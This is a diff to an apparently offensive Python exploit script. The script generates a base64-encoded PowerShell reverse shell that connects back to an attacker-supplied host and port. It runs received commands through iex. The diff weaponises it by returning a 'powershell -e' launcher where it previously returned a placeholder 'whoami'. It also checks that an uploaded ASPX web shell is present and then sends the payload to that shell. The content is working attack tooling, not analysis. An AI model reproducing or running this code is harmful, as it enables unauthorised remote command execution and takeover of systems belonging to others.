@@ -50,8 +50,9 @@ def generate_shellcode(LHOST, LPORT):
 	command = f"$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
 	
 	encoded = base64.b64encode(command.encode("utf-16le"))
-	print(encoded)
-	return "whoami"
+	encoded = encoded.decode()
+
+	return f"powershell -e {encoded}"
 
 def send_shell(ip, LHOST, LPORT):
 	# Generate powershell base64 code
@@ -78,8 +79,12 @@ def send_shell(ip, LHOST, LPORT):
 		'testing': 'execute'
 	}
 	
-	# Use regex to get out any input cookie requirements
+	# Use regex to get out any input cookie requirements from first web request
 	r = s.get(target)
+	if r.status_code == 404:
+		print("ASPX Shell not successfully uploaded!")
+		exit(0)
+
 	htmlText = r.text
 	input_fields = re.findall(r'input type=\"hidden\" .* />', htmlText)
 	for input_field in input_fields:
@@ -91,7 +96,6 @@ def send_shell(ip, LHOST, LPORT):
 		target,
 		data=data
 	)
-	print(r.text)
 
 def main():
     if len(sys.argv) != 2:
